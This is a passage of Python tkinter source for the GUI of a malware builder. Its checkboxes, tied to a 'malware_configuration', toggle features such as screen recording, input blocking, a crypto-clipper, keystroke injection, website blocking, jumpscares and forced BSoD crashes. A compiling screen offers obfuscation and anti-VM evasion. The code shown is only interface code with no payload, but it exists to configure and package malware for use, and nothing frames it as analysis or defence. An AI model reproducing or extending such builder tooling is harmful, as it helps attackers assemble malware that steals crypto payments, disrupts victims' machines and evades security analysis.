        self.cb_scrnrec.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['scrnrec']))
        self.cb_scrnrec.bind("<Leave>", self.hide_tooltip)
        self.cbvar_scrnrec.set(self.malware_configuration['functionalities']['scrnrec'])
        self.canvas.create_window(x_start, y_start+y_delta*9, window=self.cb_scrnrec, anchor='w')

        self.cbvar_inputbl = tk.BooleanVar(value=True)
        self.cb_inputbl = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='input blocking',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_inputbl,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_inputbl.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['inputbl']))
        self.cb_inputbl.bind("<Leave>", self.hide_tooltip)
        self.cbvar_inputbl.set(self.malware_configuration['functionalities']['inputbl'])
        self.canvas.create_window(x_start, y_start+y_delta*10, window=self.cb_inputbl, anchor='w')

        self.cbvar_crclipr = tk.BooleanVar(value=True)
        self.cb_crclipr = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='crypto-clipper',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_crclipr,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_crclipr.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['crclipr']))
        self.cb_crclipr.bind("<Leave>", self.hide_tooltip)
        self.cbvar_crclipr.set(self.malware_configuration['functionalities']['crclipr'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*0, window=self.cb_crclipr, anchor='w')

        self.cbvar_messger = tk.BooleanVar(value=True)
        self.cb_messger = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='messager',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_messger,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_messger.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['messger']))
        self.cb_messger.bind("<Leave>", self.hide_tooltip)
        self.cbvar_messger.set(self.malware_configuration['functionalities']['messger'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*1, window=self.cb_messger, anchor='w')

        self.cbvar_txtspee = tk.BooleanVar(value=True)
        self.cb_txtspee = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='Text-to-Speech',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_txtspee,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_txtspee.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['txtspee']))
        self.cb_txtspee.bind("<Leave>", self.hide_tooltip)
        self.cbvar_txtspee.set(self.malware_configuration['functionalities']['txtspee'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*2, window=self.cb_txtspee, anchor='w')

        self.cbvar_audctrl = tk.BooleanVar(value=True)
        self.cb_audctrl = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='audio controlling',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_audctrl,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_audctrl.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['audctrl']))
        self.cb_audctrl.bind("<Leave>", self.hide_tooltip)
        self.cbvar_audctrl.set(self.malware_configuration['functionalities']['audctrl'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*3, window=self.cb_audctrl, anchor='w')

        self.cbvar_monctrl = tk.BooleanVar(value=True)
        self.cb_monctrl = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='monitors controlling',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_monctrl,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_monctrl.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['monctrl']))
        self.cb_monctrl.bind("<Leave>", self.hide_tooltip)
        self.cbvar_monctrl.set(self.malware_configuration['functionalities']['monctrl'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*4, window=self.cb_monctrl, anchor='w')

        self.cbvar_webbloc = tk.BooleanVar(value=True)
        self.cb_webbloc = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='website blocking',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_webbloc,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_webbloc.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['webbloc']))
        self.cb_webbloc.bind("<Leave>", self.hide_tooltip)
        self.cbvar_webbloc.set(self.malware_configuration['functionalities']['webbloc'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*5, window=self.cb_webbloc, anchor='w')

        self.cbvar_jmpscar = tk.BooleanVar(value=True)
        self.cb_jmpscar = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='jumpscare',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_jmpscar,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_jmpscar.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['jmpscar']))
        self.cb_jmpscar.bind("<Leave>", self.hide_tooltip)
        self.cbvar_jmpscar.set(self.malware_configuration['functionalities']['jmpscar'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*6, window=self.cb_jmpscar, anchor='w')

        self.cbvar_keystrk = tk.BooleanVar(value=True)
        self.cb_keystrk = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='keystroke type',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_keystrk,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_keystrk.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['keystrk']))
        self.cb_keystrk.bind("<Leave>", self.hide_tooltip)
        self.cbvar_keystrk.set(self.malware_configuration['functionalities']['keystrk'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*7, window=self.cb_keystrk, anchor='w')

        self.cbvar_scrnman = tk.BooleanVar(value=True)
        self.cb_scrnman = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screen manipulation',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_scrnman,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_scrnman.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['scrnman']))
        self.cb_scrnman.bind("<Leave>", self.hide_tooltip)
        self.cbvar_scrnman.set(self.malware_configuration['functionalities']['scrnman'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*8, window=self.cb_scrnman, anchor='w')

        self.cbvar_bluesod = tk.BooleanVar(value=True)
        self.cb_bluesod = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='BSoD',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_bluesod,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_bluesod.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['bluesod']))
        self.cb_bluesod.bind("<Leave>", self.hide_tooltip)
        self.cbvar_bluesod.set(self.malware_configuration['functionalities']['bluesod'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*9, window=self.cb_bluesod, anchor='w')

    def compiling_settings(self):
        self.general_settings_button['state'] = tk.NORMAL
        self.general_settings_button['relief'] = 'groove'
        self.functionality_settings_button ['state'] = tk.NORMAL
        self.functionality_settings_button['relief'] = 'groove'
        self.compiling_settings_button['state'] = tk.DISABLED
        self.compiling_settings_button['relief'] = 'flat'
        self.save_configuration(True, from_window=self.current_window)
        self.current_window = 3
        self.new_background(3)

        self.time_check = time.time()
        
        self.cbvar_obfuscation = tk.BooleanVar(value=True)
        self.cb_obfuscation = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='obfuscation',
            font=('Consolas', 14),
            variable=self.cbvar_obfuscation,
            onvalue=True,
            offvalue=False
        )
        self.cb_obfuscation.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['obfuscation']))
        self.cb_obfuscation.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(100, 125, window=self.cb_obfuscation, anchor='w')

        self.cbvar_antivm = tk.BooleanVar(value=True)
        self.cb_antivm = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='anti-VM',
            font=('Consolas', 14),
            variable=self.cbvar_antivm,
            command=lambda:self.double_click_settings('antivm'),
            onvalue=True,
            offvalue=False
        )
        self.cb_antivm.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['anti_vm']))
        self.cb_antivm.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(100, 165, window=self.cb_antivm, anchor='w')





        # Icon
        # Anti-VM   /w advanced options
        # Obfuscation
        




def main():
    global builder_configuration
    root = tk.Tk()
    Builder(root)
    root.geometry(str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root_geometry']['width'])+'x'+str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root_geometry']['height']))
    #root.wm_attributes('-transparentcolor', '#ab23ff')
    root.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
    root.mainloop()

if __name__ == '__main__':
    main()
